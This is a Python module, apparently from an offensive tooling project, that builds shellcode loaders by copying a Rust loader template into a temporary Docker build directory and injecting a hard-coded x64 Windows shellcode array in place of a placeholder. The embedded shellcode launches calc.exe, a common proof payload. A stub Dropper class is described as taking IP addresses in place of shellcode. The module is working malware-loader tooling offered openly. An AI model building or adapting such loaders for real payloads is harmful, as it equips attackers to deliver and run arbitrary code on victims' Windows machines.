## Constructs code for binaries
## Meant to be called from binary_models.py, but can be called form anywhere.

# Plan:
#  - Create dir in /tmp, with UUID as name.
#  - _Copy_ loader into this dir.
#  - Copy shellcode into loader. Use .replace() as a macro system
#  - Pass needed values (path of loader) into docker script
#  - Run docker script.

import shutil
import uuid
from pathlib import Path

from modules.log import log

logger = log(__name__)

SHELLCODE = """0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
0x63, 0x2e, 0x65, 0x78, 0x65, 0x00"""


class Loader:
    def __init__(self, loader_source_code_path, shellcode):
        self.loader_source_code_path = Path(loader_source_code_path)
        self.shellcode = shellcode

        logger.debug(f"Loader source code path: {str(loader_source_code_path)}")
        logger.debug(f"Loader shellcode {shellcode}")

    def construct(self):
        try:
            # Create a unique temp directory
            # will need to clean this up every so often.
            build_context_tmp_dir = Path("_docker/build_tmp") / str(uuid.uuid4())
            build_context_tmp_dir.mkdir(parents=True, exist_ok=True)

            logger.debug(f"Loader being constructed in {str(build_context_tmp_dir)}")

            # Copy the source code to the temp directory
            logger.debug(
                f"Copying {self.loader_source_code_path} to {build_context_tmp_dir}"
            )
            # Copy the entire contents of the source directory to the temp directory
            # Copy the entire contents of the source directory to the build context temp directory
            try:
                shutil.copytree(
                    self.loader_source_code_path,
                    build_context_tmp_dir,
                    dirs_exist_ok=True,
                )
                print(
                    f"Copied contents of {self.loader_source_code_path} to {build_context_tmp_dir}"
                )
            except Exception as e:
                print(f"Error copying files: {e}")

            main_rs_file = build_context_tmp_dir / "src" / "main.rs"

            logger.debug(f"Looking for main.rs at {str(main_rs_file)}")

            # Read and process the source file to replace the placeholder with shellcode
            with main_rs_file.open("r") as file:
                source_code = file.read()

            # Format the shellcode for Rust as a byte array
            shellcode_array = (
                SHELLCODE  # ", ".join(f"0x{byte:02x}" for byte in self.shellcode)
            )

            # can change this up later to do a "let shellcode: [whatever]" if needed.
            # for now, it just replaces the current array contents
            processed_code = source_code.replace(
                "SHELLCODE_PLACEHOLDER", f"{shellcode_array}"
            )

            # Write the processed code back to the temporary file
            with main_rs_file.open("w") as file:
                file.write(processed_code)

            # Return the path of the modified file
            return build_context_tmp_dir
        except Exception as e:
            logger.error(e)
            raise e


class Dropper:
    ...

    # same as loader, but with IP's n stuff instead of shellcode
